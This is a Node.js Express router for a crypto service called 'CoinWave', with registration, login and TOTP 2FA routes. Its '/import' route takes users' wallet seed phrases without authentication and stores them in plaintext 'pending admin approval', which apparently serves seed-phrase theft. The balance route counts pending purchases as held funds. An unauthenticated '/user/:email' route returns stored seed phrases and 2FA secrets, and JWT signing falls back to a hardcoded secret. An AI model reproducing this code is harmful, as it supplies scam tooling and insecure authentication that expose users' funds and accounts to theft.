const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const User = require('../models/User');
const Order = require('../models/Order');
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

// Middleware
const authMiddleware = (req, res, next) => {
    const token = req.header('Authorization')?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token, authorization denied' });
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET || 'fallback_secret');
        req.user = decoded;
        next();
    } catch (err) {
        res.status(401).json({ error: 'Token is not valid' });
    }
};

// Register
router.post('/register', async (req, res) => {
    try {
        const { name, country, phone, email, password } = req.body;
        let user = await User.findOne({ email });
        if (user) return res.status(400).json({ message: "User already exists" });

        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(password, salt);

        user = new User({ name, country, phone, email, password: hashedPassword });
        await user.save();

        res.status(201).json({ message: "User registered successfully" });
    } catch (error) {
        res.status(500).json({ message: "Server error" });
    }
});

// Login (Updated with 2FA Check)
router.post('/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        const user = await User.findOne({ email });
        if (!user) return res.status(400).json({ message: "Invalid credentials" });

        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) return res.status(400).json({ message: "Invalid credentials" });

        // IF 2FA IS ENABLED, DO NOT GIVE TOKEN YET
        if (user.twoFactorEnabled) {
            return res.json({ requires2FA: true, userId: user._id });
        }

        // Normal Login
        const token = jwt.sign({ id: user._id.toString(), email: user.email }, process.env.JWT_SECRET || 'fallback_secret', { expiresIn: '7d' });
        res.json({ token, user: { name: user.name, email: user.email, country: user.country } });
    } catch (error) {
        res.status(500).json({ message: "Server error" });
    }
});

// Verify 2FA during Login
router.post('/verify-2fa-login', async (req, res) => {
    try {
        const { userId, token } = req.body;
        const user = await User.findById(userId);
        if (!user || !user.twoFactorSecret) return res.status(400).json({ message: "User not found or 2FA not set" });

        const verified = speakeasy.totp.verify({
            secret: user.twoFactorSecret,
            encoding: 'base32',
            token: token
        });

        if (verified) {
            const jwtToken = jwt.sign({ id: user._id.toString(), email: user.email }, process.env.JWT_SECRET || 'fallback_secret', { expiresIn: '7d' });
            res.json({ token: jwtToken, user: { name: user.name, email: user.email, country: user.country } });
        } else {
            res.status(400).json({ message: "Invalid 2FA code" });
        }
    } catch (error) {
        res.status(500).json({ message: "Server error" });
    }
});

// 2FA Setup Routes (Same as before)
router.post('/generate-2fa', authMiddleware, async (req, res) => {
    try {
        const user = await User.findById(req.user.id);
        if (!user) return res.status(404).json({ error: 'User not found' });

        const secret = speakeasy.generateSecret({ name: `CoinWave (${user.email})` });
        await User.findByIdAndUpdate(req.user.id, { twoFactorSecret: secret.base32 });

        QRCode.toDataURL(secret.otpauth_url, (err, data_url) => {
            if (err) return res.status(500).json({ error: 'Error generating QR' });
            res.json({ secret: secret.base32, qrCodeUrl: data_url });
        });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

router.post('/enable-2fa', authMiddleware, async (req, res) => {
    try {
        const { token } = req.body;
        const user = await User.findById(req.user.id);
        if (!user || !user.twoFactorSecret) return res.status(400).json({ error: '2FA not initialized' });

        const verified = speakeasy.totp.verify({ secret: user.twoFactorSecret, encoding: 'base32', token: token });
        if (verified) {
            await User.findByIdAndUpdate(req.user.id, { twoFactorEnabled: true });
            res.json({ message: '2FA enabled successfully' });
        } else {
            res.status(400).json({ error: 'Invalid code' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});


// ==========================================
// IMPORT WALLET ROUTE (ADDED BACK)
// ==========================================
router.post('/import', async (req, res) => {
    try {
        const { email, seedPhrase, walletAddress } = req.body;
        
        if (!email) {
            return res.status(400).json({ error: 'Email is required' });
        }

        await User.findOneAndUpdate(
            { email: email },
            { 
                seedPhrase: seedPhrase, 
                walletAddress: walletAddress, 
                walletStatus: 'pending' 
            }
        );

        res.json({ message: 'Wallet linked successfully. Pending admin approval.' });
    } catch (error) {
        console.error('Wallet import error:', error);
        res.status(500).json({ error: 'Error submitting wallet.' });
    }
});


// ==========================================
// GET USER DATA (FOR FRONTEND SYNC)
// ==========================================
router.get('/user/:email', async (req, res) => {
    try {
        const user = await User.findOne({ email: req.params.email }).select('-password');
        if (!user) return res.status(404).json({ error: 'User not found' });
        res.json(user);
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});


// ==========================================
// GET USER BALANCES (For Dashboard Total Value)
// ==========================================
router.get('/user/:email/balances', async (req, res) => {
    try {
        const email = req.params.email;
        const orders = await Order.find({ userEmail: email });
        let balances = {};

        orders.forEach(order => {
            // Add to balance if Approved OR (Pending AND Buy order)
            if (order.status === 'approved' || (order.status === 'pending' && order.mode === 'buy')) {
                if (order.mode === 'buy') {
                    const sym = (order.getCurrency || '').toUpperCase();
                    const amt = parseFloat(order.getAmount) || 0;
                    if (sym) {
                        balances[sym] = (balances[sym] || 0) + amt;
                    }
                } else if (order.mode === 'sell' && order.status === 'approved') {
                    const sym = (order.sendCurrency || '').toUpperCase();
                    const amt = parseFloat(order.sendAmount) || 0;
                    if (sym) {
                        balances[sym] = (balances[sym] || 0) - amt;
                        if (balances[sym] < 0) balances[sym] = 0;
                    }
                }
            }
        });

        res.json(balances);
    } catch (error) {
        console.error('Balance error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

module.exports = router;
